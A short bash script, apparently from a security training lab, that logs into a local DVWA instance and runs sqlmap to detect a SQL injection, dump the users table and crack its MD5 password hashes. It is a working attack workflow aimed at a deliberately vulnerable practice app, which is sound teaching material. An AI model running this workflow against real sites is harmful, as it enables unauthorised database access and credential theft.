#!/usr/bin/env bash
# sqlmap_demo.sh
# Automates a SQLi attack on DVWA (Low) with sqlmap: detect the injection,
# then dump + crack the users table. Shows what the manual payloads automate.
#
# Requires: sqlmap installed (brew install sqlmap) and DVWA running.
# Usage:  bash tools/sqlmap_demo.sh
set -euo pipefail

BASE="http://127.0.0.1:4280"
OUT="$PWD/sqlmap-output"          # gitignored

# --- Log in and grab an authenticated session id --------------------------
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT
TOKEN=$(curl -s -c "$JAR" "$BASE/login.php" \
        | grep -o "user_token' value='[0-9a-f]*'" | grep -o "[0-9a-f]\{32\}")
curl -s -b "$JAR" -c "$JAR" -L \
  --data-urlencode "username=admin" --data-urlencode "password=password" \
  --data-urlencode "user_token=$TOKEN" --data-urlencode "Login=Login" \
  "$BASE/login.php" -o /dev/null
SID=$(grep -o 'PHPSESSID[[:space:]].*' "$JAR" | awk '{print $NF}')

# --- Run sqlmap ------------------------------------------------------------
# -u            : the URL with the injectable 'id' parameter
# --cookie      : our logged-in session + the DVWA security level (low)
# --batch       : accept all defaults (non-interactive) so it is screenshot-clean
# --flush-session: start fresh, re-detecting from scratch
# -D / -T / --dump: target the 'dvwa' database, 'users' table, and extract it
# sqlmap auto-cracks the unsalted MD5 hashes with its built-in wordlist.
sqlmap -u "$BASE/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SID; security=low" \
  --batch --flush-session \
  -D dvwa -T users --dump \
  --output-dir="$OUT"
